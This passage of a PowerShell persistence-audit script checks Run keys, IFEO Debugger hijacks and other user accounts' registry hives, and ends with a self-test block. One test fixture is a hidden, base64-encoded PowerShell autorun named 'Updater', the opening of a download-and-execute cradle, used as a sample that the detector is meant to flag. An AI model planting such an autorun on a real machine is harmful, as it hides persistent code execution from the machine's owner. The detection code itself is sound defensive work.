    T 'no unreadable IFEO subkeys prints nothing and raises nothing' ($r.Sev -eq 'OK' -and $r.Lines.Count -eq 0) ($r.Lines -join ' | ')

    # OTHER ACCOUNTS (Section 5): graded like HKCU, a failed read is a gap.
    $ok = { param($vals) @{ State = 'ok'; Error = ''; Values = @($vals) } }
    $nk = @{ State = 'nokey'; Error = ''; Values = @() }
    $dn = @{ State = 'denied'; Error = 'SecurityException: Requested registry access is not allowed.'; Values = @() }
    $ur = @{ State = 'unreadable'; Error = 'IOException: x'; Values = @() }
    function Acct { param([string]$L, $R, [string]$How = 'signed-in', [string]$Err = '') @{ Label = $L; How = $How; Error = $Err; Keys = @(@{ Sub = 'Microsoft\Windows\CurrentVersion\Run'; R = $R }) } }
    $mal = @{ Name = 'Updater'; Value = 'powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA' }
    $ben = @{ Name = 'OneDrive'; Value = '"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background' }
    $v = Get-OtherAccountsVerdict -Accounts @(Acct 'PC\bob' (& $ok @($mal, $ben)))
    T 'another account''s encoded-PowerShell autorun is the WARNING, naming the account (it used to be an [INFO] listing)' ($v.Hit -and (($v.Lines -join "`n") -match '(?m)^\[WARNING\] Suspicious Run-key autorun in another account \[PC\\bob\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater\]')) ($v.Lines -join ' | ')
    T 'its benign twin is listed as context, never graded' ((($v.Lines -join "`n") -notmatch 'WARNING[^\r\n]*OneDrive') -and (($v.Lines -join "`n") -match 'OneDrive\.exe')) ($v.Lines -join ' | ')
    $v = Get-OtherAccountsVerdict -Accounts @(Acct 'PC\bob' (& $ok @(@{ Name = 'PSUpdater'; Value = $mal.Value })))
    T 'a value named PS* is graded (the old block filtered ^PS and hid it)' ($v.Hit) ($v.Lines -join ' | ')
    $v = Get-OtherAccountsVerdict -Accounts @(Acct 'PC\bob' $dn) -IsElevated $true
    T 'another account''s Run key refused to an ADMINISTRATOR: a raised gap, never [OK]' ($v.Gap -and -not $v.Deferred -and (($v.Lines -join "`n") -match '(?m)^\[WARNING\] Other accounts'' Run-key check NOT performed -- PC\\bob') -and (($v.Lines -join "`n") -notmatch '(?m)^\[OK\]')) ($v.Lines -join ' | ')
    $v = Get-OtherAccountsVerdict -Accounts @(Acct 'PC\bob' $dn) -IsElevated $false
    T 'the same refusal to a STANDARD user: a deferral (another account''s hive denies Users), never a gap or [OK]' ((-not $v.Gap) -and $v.Deferred -eq 1 -and (($v.Lines -join "`n") -match '(?m)^\[DEFERRED - ADMIN REQUIRED\] Other accounts'' Run keys: 1 account') -and (($v.Lines -join "`n") -notmatch '(?m)^\[OK\]')) ($v.Lines -join ' | ')
    $v = Get-OtherAccountsVerdict -Accounts @(Acct 'PC\bob' $ur) -IsElevated $false
    T 'a read that failed for another reason is a gap whatever the token' ($v.Gap) ($v.Lines -join ' | ')
    $v = Get-OtherAccountsVerdict -Accounts @() -ListError 'SecurityException: denied'
    T 'the accounts could not be listed: a raised gap, never "[OK] No other account"' ($v.Gap -and (($v.Lines -join "`n") -notmatch '(?m)^\[OK\]')) ($v.Lines -join ' | ')
    $v = Get-OtherAccountsVerdict -Accounts @(Acct 'PC\bob' $nk)
    T 'an account with no Run key at all reads clean' ((-not $v.Hit) -and (-not $v.Gap) -and (($v.Lines -join "`n") -match '(?m)^\[OK\] No suspicious Run-key autorun in 1 other account')) ($v.Lines -join ' | ')
    $v = Get-OtherAccountsVerdict -Accounts @(Acct 'PC\carol' '' 'copy' 'the copy of its registry could not be loaded (reg load exit 1)')
    T 'a signed-out account whose copy could not be loaded: a raised gap that names it' ($v.Gap -and (($v.Lines -join "`n") -match 'PC\\carol: the copy of its registry could not be loaded')) ($v.Lines -join ' | ')
    $v = Get-OtherAccountsVerdict -Accounts @() -NotRead @('PC\carol') -NotReadWhy 'not signed in; reading it needs an elevated run without -readonly'
    T 'a signed-out account left unread is NAMED, never silent and never [OK]' ((($v.Lines -join "`n") -match '(?m)^\[INFO\] 1 signed-out account\(s\) not read: PC\\carol \(not signed in') -and (($v.Lines -join "`n") -notmatch '(?m)^\[OK\]')) ($v.Lines -join ' | ')
    $v = Get-OtherAccountsVerdict -Accounts @((Acct 'PC\bob' (& $ok @($mal))), (Acct 'PC\dan' $dn)) -IsElevated $true
    T 'a hit AND a gap: both raised' ($v.Hit -and $v.Gap) ($v.Lines -join ' | ')
    $v = Get-OtherAccountsVerdict -Accounts @(Acct 'PC\bob' (& $ok @(@{ Name = 'x'; Value = ("a`r`n[OK] forged") })))
    T 'control characters in a value cannot start a report line' ((($v.Lines -join "`n") -notmatch '(?m)^\[OK\] forged')) ($v.Lines -join ' | ')
    $profs = @(@{ Sid = 'S-1-5-21-1-2-3-1001' }, @{ Sid = 'S-1-5-21-1-2-3-1002' }, @{ Sid = 'S-1-5-21-1-2-3-1003' }, @{ Sid = 'S-1-5-18' })
    $so = @(Select-SignedOutProfiles -Profiles $profs -Loaded @('S-1-5-21-1-2-3-1002') -MySid 'S-1-5-21-1-2-3-1001')
    T 'signed out = a user profile that is neither loaded nor the audit''s own (SYSTEM is not a user)' ($so.Count -eq 1 -and [string]$so[0].Sid -eq 'S-1-5-21-1-2-3-1003') (($so | ForEach-Object { $_.Sid }) -join ',')
    $g = @(Get-RunKeyGapLines -Unread @('HKCU:\Software\Microsoft\Windows\CurrentVersion\Run - SecurityException: denied'))
    T 'the user''s own Run key that could not be read is a raised gap (the old loop skipped it silently)' ($g.Count -eq 1 -and $g[0] -match '^\[WARNING\] Run-key evaluation NOT performed in full -- ') ($g -join ' | ')

    if ($fails) { Write-Output "[FAIL] $fails persistence_eval self-test expectation(s) unmet"; exit 1 }
    Write-Output "[OK] persistence_eval self-test: the owner's $($benign.Count) real autoruns are not findings, encoded/downloading/staged ones are, and Process Explorer's Replace Task Manager is context while an unsigned impostor is the hijack."
    exit 0
}

if ($Elevated -lt 0) {
    $Elevated = 0
    try {
        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
        if ((New-Object Security.Principal.WindowsPrincipal($id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { $Elevated = 1 }
    } catch {}
}

if ($Part -eq 'OtherAccounts') {
    # Stale mounts from an interrupted run come off first: each is only a
    # COPY, but it holds a temp file until it is unloaded.
    if ($Elevated -eq 1) {
        $stale = @()
        try { $stale = @([Microsoft.Win32.Registry]::Users.GetSubKeyNames() | Where-Object { $_ -match '^dz_sec_\d+_\d+$' }) } catch {}
        foreach ($m in $stale) { & reg.exe unload ("HKU\" + $m) 2>&1 | Out-Null; ('[INFO] An earlier run''s copy of an account registry was still mounted as HKU\' + $m + ' and has been unloaded' + $(if ($LASTEXITCODE -ne 0) { ' -- FAILED (it goes at reboot; tools\unload_audit_hives.ps1 retries)' } else { '' }) + '.') }
    }
    $tmpRoot = $env:TEMP; if (-not $tmpRoot) { $tmpRoot = [IO.Path]::GetTempPath() }
    $mySid = ''; try { $mySid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value } catch {}
    $accounts = New-Object System.Collections.ArrayList
    $notRead = New-Object System.Collections.ArrayList
    $listErr = ''
    $mounts = New-Object System.Collections.ArrayList
    $nameOf = { param([string]$sid, [string]$fallback)
        try { return ([Security.Principal.SecurityIdentifier]$sid).Translate([Security.Principal.NTAccount]).Value } catch { if ($fallback) { return $fallback } return $sid } }
    $readAccount = { param([string]$label, [string]$how, $base, [string]$prefix)
        $keys = @($script:RunSubs | ForEach-Object { @{ Sub = $_; R = (Read-RunValues -Base $base -SubPath ($prefix + '\' + $_)) } })
        # The account's own Software key refused is the account refused.
        $err = ''
        $all = @($keys | Where-Object { [string]$_.R.State -eq 'denied' })
        if ($all.Count -eq $keys.Count) { $err = 'denied' }
        return @{ Label = $label; How = $how; Error = $err; Keys = $keys } }
    try {
        if (@($OtherRoot).Count -gt 0) {
            foreach ($o in $OtherRoot) {
                $sub = ([string]$o) -replace '^HKCU:\\', ''
                [void]$accounts.Add((& $readAccount ([string]$o) 'ci' ([Microsoft.Win32.Registry]::CurrentUser) $sub))
            }
        } else {
            $loaded = @()
            try { $loaded = @([Microsoft.Win32.Registry]::Users.GetSubKeyNames()) } catch { $listErr = ('HKEY_USERS could not be listed: ' + $_.Exception.Message) }
            $signedIn = @($loaded | Where-Object { $_ -match '^S-1-5-21-[\d-]+$' -and $_ -ne $mySid })
            foreach ($sid in $signedIn) { [void]$accounts.Add((& $readAccount (& $nameOf $sid '') 'signed-in' ([Microsoft.Win32.Registry]::Users) ($sid + '\Software'))) }
            # Profiles on this PC (signed in or not), from ProfileList.
            $profiles = New-Object System.Collections.ArrayList
            $pl = $null
            try {
                $pl = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList', $false)
                if ($null -eq $pl) { throw 'the ProfileList key is missing' }
                foreach ($sid in @($pl.GetSubKeyNames())) {
                    $sk = $null
                    try { $sk = $pl.OpenSubKey($sid, $false); $pth = ''; if ($sk) { $pth = [Environment]::ExpandEnvironmentVariables([string]$sk.GetValue('ProfileImagePath')) }; [void]$profiles.Add(@{ Sid = $sid; Path = $pth }) } finally { if ($sk) { $sk.Close() } }
                }
            } catch { if (-not $listErr) { $listErr = ('the profile list could not be read: ' + $_.Exception.Message) } } finally { if ($pl) { $pl.Close() } }
            $n = 0
            foreach ($pf in @(Select-SignedOutProfiles -Profiles @($profiles.ToArray()) -Loaded $loaded -MySid $mySid)) {
                $label = (& $nameOf ([string]$pf.Sid) (Split-Path -Leaf ([string]$pf.Path)))
                if (-not ($LoadSignedOut -and $Elevated -eq 1)) { [void]$notRead.Add($label); continue }
                $n++
                $hive = Join-Path ([string]$pf.Path) 'NTUSER.DAT'
                $dir = Join-Path $tmpRoot ('dz_hive_' + $PID + '\' + $n)
                $mount = ('dz_sec_' + $PID + '_' + $n)
                try {
                    if (-not (Test-Path -LiteralPath $hive)) { [void]$accounts.Add(@{ Label = $label; How = 'copy'; Error = ('its registry file was not found at ' + $hive); Keys = @() }); continue }
                    New-Item -ItemType Directory -Path $dir -Force -ErrorAction Stop | Out-Null
                    Copy-Item -LiteralPath $hive -Destination (Join-Path $dir 'NTUSER.DAT') -Force -ErrorAction Stop
                    foreach ($lg in 'NTUSER.DAT.LOG1', 'NTUSER.DAT.LOG2') { $lp = Join-Path ([string]$pf.Path) $lg; if (Test-Path -LiteralPath $lp) { Copy-Item -LiteralPath $lp -Destination (Join-Path $dir $lg) -Force -ErrorAction SilentlyContinue } }
                    $lo = (& reg.exe load ("HKU\" + $mount) (Join-Path $dir 'NTUSER.DAT') 2>&1 | ForEach-Object { [string]$_ }) -join ' '
                    if ($LASTEXITCODE -ne 0) { [void]$accounts.Add(@{ Label = $label; How = 'copy'; Error = ('the copy of its registry could not be loaded (' + $lo + ')'); Keys = @() }); continue }
                    [void]$mounts.Add(@{ Mount = $mount; Dir = $dir })
                    [void]$accounts.Add((& $readAccount ($label + ', signed out, read from a copy') 'copy' ([Microsoft.Win32.Registry]::Users) ($mount + '\Software')))
                } catch { [void]$accounts.Add(@{ Label = $label; How = 'copy'; Error = ('its registry could not be copied (' + $_.Exception.Message + ')'); Keys = @() }) }
            }
        }
    } finally {
        # Every handle is closed by Read-RunValues; collect, then unload.
        [GC]::Collect(); [GC]::WaitForPendingFinalizers()
        foreach ($m in $mounts) {
            $okU = $false
            for ($i = 0; $i -lt 5 -and -not $okU; $i++) { & reg.exe unload ("HKU\" + $m.Mount) 2>&1 | Out-Null; if ($LASTEXITCODE -eq 0) { $okU = $true } else { Start-Sleep -Milliseconds 400; [GC]::Collect() } }
            if (-not $okU) { ('[INFO] The copy mounted as HKU\' + $m.Mount + ' could not be unloaded; it is a copy, so the account is unaffected, and it goes at reboot (tools\unload_audit_hives.ps1 retries).') }
            Remove-Item -LiteralPath $m.Dir -Recurse -Force -ErrorAction SilentlyContinue
        }
        if ($mounts.Count -gt 0 -or (Test-Path -LiteralPath (Join-Path $tmpRoot ('dz_hive_' + $PID)))) { Remove-Item -LiteralPath (Join-Path $tmpRoot ('dz_hive_' + $PID)) -Recurse -Force -ErrorAction SilentlyContinue }
    }
    $why = $(if ($Elevated -ne 1) { 'not signed in; reading a signed-out account needs an elevated run' } elseif (-not $LoadSignedOut) { 'not signed in; this run did not read signed-out accounts (-readonly, or not asked)' } else { '' })
    $v = Get-OtherAccountsVerdict -Accounts @($accounts.ToArray()) -NotRead @($notRead.ToArray()) -ListError $listErr -IsElevated ($Elevated -eq 1) -NotReadWhy $why
    foreach ($l in $v.Lines) { $l }
    if ($v.Hit -and $MarkerFile) { Write-MarkerFile -Path $MarkerFile -Value 'WARNING' }
    if ($v.Gap -and $GapFile) { Write-MarkerFile -Path $GapFile -Value 'WARNING' }
    if ([int]$v.Deferred -gt 0 -and $DeferredFile) { Write-MarkerFile -Path $DeferredFile -Value ([string][int]$v.Deferred) }
    if ($DoneFile) { Write-MarkerFile -Path $DoneFile -Value 'done' }
    exit 0
}

$runKeys = @(
    'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
    'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
    'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKCU:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run',
    'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
)

$found = $false
$runUnread = @()

foreach ($k in $runKeys) {
    # Exact value names through the key itself: no PowerShell note properties
    # to filter (the old '^PS' prefix test hid any autorun named PS*, and the
    # exact-name list that replaced it is no longer needed), and a key that
    # could not be read is a raised gap, never skipped.
    $base = $(if ($k.StartsWith('HKCU:')) { [Microsoft.Win32.Registry]::CurrentUser } else { [Microsoft.Win32.Registry]::LocalMachine })
    $rv = Read-RunValues -Base $base -SubPath ($k -replace '^HK(CU|LM):\\', '')
    if ([string]$rv.State -eq 'nokey') { continue }
    if ([string]$rv.State -ne 'ok') { $runUnread += ($k + ' - ' + [string]$rv.Error); continue }
    foreach ($p in @($rv.Values)) {
        $val = [string]$p.Value
        if (-not $val) { continue }

        $why = Get-AutorunVerdict -Key $k -Name $p.Name -Value $val
        if ($why) {
            $found = $true
            # Value NAME on the [WARNING] line so it is greppable per-entry.
            "[WARNING] Suspicious Run-key autorun [$($k)\$($p.Name)]: $val"
            "  indicator: $why"
            Write-WhenCaveat
            $w = Get-WhenLine -KeyPath $k -FilePath (Get-AutorunBinary $val)
            if ($w) { $w }
        }
    }
}
foreach ($l in (Get-RunKeyGapLines -Unread $runUnread)) { $l }
if ($runUnread.Count -gt 0 -and $GapFile) { Write-MarkerFile -Path $GapFile -Value 'WARNING' }

$ifeoBase = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'
$ifeoOk = $true
$subs = @()
$ifeoErr = @()
# Per-subkey errors ("Requested registry access is not allowed") are collected,
# not fatal: one restricted subkey used to terminate the enumeration (-EA Stop)
# and lose the entire check. [SKIPPED] is now reserved for the BASE key being
# unreadable.
try {
    if (Test-Path -LiteralPath $ifeoBase) {
        $subs = @(Get-ChildItem -Path $ifeoBase -EA SilentlyContinue -ErrorVariable ifeoErr)
    } else { $ifeoOk = $false }
} catch { $ifeoOk = $false }
if (-not $ifeoOk) {
    '[SKIPPED] IFEO enumeration failed -- Debugger-hijack evaluation NOT performed.'
} else {
    $ifeoUnreadable = @()
    foreach ($e in @($ifeoErr)) {
        $t = [string]$e.TargetObject
        if (-not $t) { $t = [string]$e.CategoryInfo.TargetName }
        if ($t) { $ifeoUnreadable += ($t -replace '^.*[\\/]', '') }
    }
    $rr = Get-IfeoReadReport -Unreadable $ifeoUnreadable -IsElevated ($Elevated -eq 1)
    foreach ($l in $rr.Lines) { $l }
    if ($rr.Sev -eq 'WARNING') { $found = $true }
    foreach ($sub in $subs) {
        $d = Get-ItemProperty -Path $sub.PSPath -Name Debugger -EA SilentlyContinue
        if ($d -and $d.Debugger) {
            $dbg = [string]$d.Debugger
            $bin = Get-AutorunBinary $dbg
            $signed = $false; $signer = ''
            if ($bin) {
                try {
                    $sig = Get-AuthenticodeSignature -FilePath $bin -EA Stop
                    if ($sig -and $sig.Status -eq 'Valid') { $signed = $true; $signer = [string]$sig.SignerCertificate.Subject }
                } catch {}
            }
            $v = Get-IfeoVerdict -Target $sub.PSChildName -Debugger $dbg -DebuggerSigned $signed -DebuggerSigner $signer
            $v.Line
            if ($v.Sev -eq 'WARNING') {
                $found = $true
                Write-WhenCaveat
                $w = Get-WhenLine -KeyPath $sub.PSPath -FilePath $bin
                if ($w) { $w }
            }
        }
    }
}

if (-not $found -and $runUnread.Count -eq 0) {
    '[OK] No suspicious Run-key autoruns or IFEO Debugger hijacks.'
} elseif (-not $found) {
    '[INFO] No suspicious Run-key autorun or IFEO Debugger hijack in what could be read.'
} elseif ($MarkerFile) {
    Write-MarkerFile -Path $MarkerFile -Value 'hit'
}
